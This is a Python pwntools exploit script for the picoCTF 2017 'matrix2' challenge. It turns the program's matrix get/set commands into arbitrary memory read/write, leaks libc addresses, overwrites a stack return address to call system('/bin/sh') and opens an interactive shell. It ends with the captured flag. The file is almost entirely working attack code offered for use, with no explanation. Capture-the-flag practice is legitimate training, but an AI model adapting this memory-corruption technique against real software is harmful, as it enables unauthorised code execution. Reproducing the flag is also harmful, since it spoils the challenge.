#! /usr/bin/env python2

from pwn import *
import struct
import sys

def f2p(fv):
    return struct.unpack("<I", struct.pack("<f", fv))[0]

def p2f(p):
    return struct.unpack("<f", struct.pack("<I", p))[0]

def p2rc(p, rows, cols):
    p /= 4
    return p / cols, p % cols

rows = 8192
cols = 8192
matrices = 0x804b080
p_libc_start_main = 0x804afec

if args['REMOTE']:
    r = remote("shell2017.picoctf.com", 13265)
    allocs = 15
    off_system = 0x3e3e0
    off_libc_start_main = 0x19970
    off_environ = 0x1aade0
    off_progname_full = 0x1a9880
    off_puts = 0x64da0
else:
    # qira running matrix2 on another machine
    # r = process("./matrix2")
    r = remote("192.168.0.7", 4000)
    allocs = 15
    # off_system = 0x3c290
    # off_libc_start_main = 0x18270
    # off_environ = 0x1bdd9c
    # off_progname_full = 0x1bcbc8
    # off_puts = 0x62300
    off_system = 0x3af40
    off_libc_start_main = 0x180a0
    off_environ = 0x1b6d9c
    off_progname_full = 0x1b5bc8
    off_puts = 0x605d0

m = allocs - 1
for i in xrange(allocs):
    r.recvuntil("Enter command: ")
    r.sendline("create {} {}".format(rows, cols))

print "achieved NULL pointer"

# read out matrices[0]
row, col = p2rc(matrices, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("get {} {} {}".format(m, row, col))
r.recvuntil("Matrix[{}][{}] = ".format(row, col))
m0 = f2p(float(r.recvline()))

print "matrices[0]     = {}".format(hex(m0))

if m0 >= rows * cols * 4:
    print "rip... try again"
    sys.exit(0)

print "gaining read/write over full address space"
# set matrices[0] to have full address space read/write
row, col = p2rc(m0, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("set {} {} {} {}".format(m, row, col, p2f(32768)))
r.recvline()
row, col = p2rc(m0 + 4, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("set {} {} {} {}".format(m, row, col, p2f(32768)))
r.recvline()
row, col = p2rc(m0 + 8, rows, cols)
r.sendline("set {} {} {} {}".format(m, row, col, p2f(0)))
r.recvline()

# we can now use these
rows = cols = 32768
m = 0

# leak libc
row, col = p2rc(p_libc_start_main, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("get {} {} {}".format(m, row, col))
r.recvuntil("Matrix[{}][{}] = ".format(row, col))
libc_start_main = f2p(float(r.recvline()))

libc_base = libc_start_main - off_libc_start_main
system = libc_base + off_system
environ = libc_base + off_environ
progname_full = libc_base + off_progname_full
puts = libc_base + off_puts

print "libc_start_main = {}".format(hex(libc_start_main))
print "system          = {}".format(hex(system))
print "environ         = {}".format(hex(environ))
print "progname_full   = {}".format(hex(progname_full))

# make matrices[1] point to environ and read out its shit
row, col = p2rc(matrices + 4, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("set {} {} {} {}".format(m, row, col, p2f(environ)))
r.recvline()
r.sendline("list")
r.recvline()
l = r.recvline()[11:]
e0 = int(l[:l.find(" ")]) & 0xffffffff

print "environ -> {}".format(hex(e0))

hc_ret = e0 - 352

# write "/bin/sh" somewhere
row, col = p2rc(matrices + 4, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("set {} {} {} {}".format(m, row, col, p2f(u32("/bin"))))
r.recvline()
row, col = p2rc(matrices + 8, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("set {} {} {} {}".format(m, row, col, p2f(u32("/sh\x00"))))
r.recvline()

print "hc_ret     = {}".format(hex(hc_ret))
print "hc_ret + 8 = {}".format(hex(hc_ret + 8))

# write "/bin/sh" to system's argument
row, col = p2rc(hc_ret + 28, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("set {} {} {} {}".format(m, row, col, p2f(matrices + 4)))
r.recvline()

# write system to ret addr of pop pop pop pop ret
row, col = p2rc(hc_ret + 20, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("set {} {} {} {}".format(m, row, col, p2f(system)))
r.recvline()

# write pop pop pop pop ret to handle_command's ret addr
row, col = p2rc(hc_ret, rows, cols)
r.recvuntil("Enter command: ")
r.sendline("set {} {} {} {}".format(m, row, col, p2f(0x8048a85)))
r.recvline()

print "triggering exploit..."
r.interactive()

# flag: 6271e0c26371220cc1c7166fda9f7d72
